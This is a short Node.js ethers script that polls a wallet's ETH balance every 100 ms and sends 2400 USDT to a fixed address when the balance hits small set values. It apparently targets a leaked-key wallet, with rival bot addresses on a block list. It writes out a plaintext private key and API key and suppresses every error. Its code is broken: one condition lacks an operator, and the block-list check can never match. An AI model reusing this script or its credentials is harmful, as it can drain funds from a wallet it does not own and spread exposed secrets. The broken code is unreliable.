const { ethers } = require("ethers");

// Configuration
const alchemyApi = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn";
const senderAddress = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3";
const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258";
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const receiverAddress = "0x08f695b8669b648897ed5399b9b5d951b72881a0";

// Blocked bot addresses
const blockedAddresses = new Set([
    "0x08fc7400BA37FC4ee1BF73BeD5dDcb5db6A1036A",
    "0x272c2EA4C76E5c116213136D04d3E8051d1F6e3A",
    "0xb6ed7c545e4792479EC08Abd512593315084cDC9",
    "0x073E12b3C7F9583FdbC738b4f1AfEC95010f2D28",
    "0xD7040a105505EEF85752A9E94128922fb9110b1e",
    "0xB74E09179492C7cb5A0Aff57894EF94Fc0fED1D8",
]);

// Initialize provider and wallet
const provider = new ethers.JsonRpcProvider(alchemyApi);
const wallet = new ethers.Wallet(privateKey, provider);

// USDT Contract ABI (Only the transfer function is required)
const usdtAbi = [
    "function transfer(address to, uint256 value) external returns (bool)"
];

// USDT Contract Instance
const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);

// Function to send 2400 USDT
async function sendUSDT() {
    try {
        // Convert 2400 USDT to smallest unit (6 decimals for USDT)
        const amount = ethers.parseUnits("2400", 6);

        // Ensure receiver is not a blocked address
        if (blockedAddresses.has(receiverAddress.toLowerCase())) {
            return; // Do nothing if receiver is blocked
        }

        // Send transaction
        const tx = await usdtContract.transfer(receiverAddress, amount);
        await tx.wait(); // Wait for confirmation
    } catch (error) {
        // Suppress errors silently
    }
}

// Function to monitor ETH balance
async function monitorBalance() {
    try {
        const balance = await provider.getBalance(senderAddress);
        const ethBalance = parseFloat(ethers.formatEther(balance));

        // Trigger USDT transfer if balance matches criteria
        if (ethBalance === 0.003 || ethBalance === 0.002  ethBalance === 0.001) {
            await sendUSDT();
        }
    } catch (error) {
        // Suppress errors silently
    }
}

// Main function to start monitoring
function startMonitoring() {
    // Poll balance every 100 milliseconds
    setInterval(monitorBalance, 100);
}

// Start the script
startMonitoring();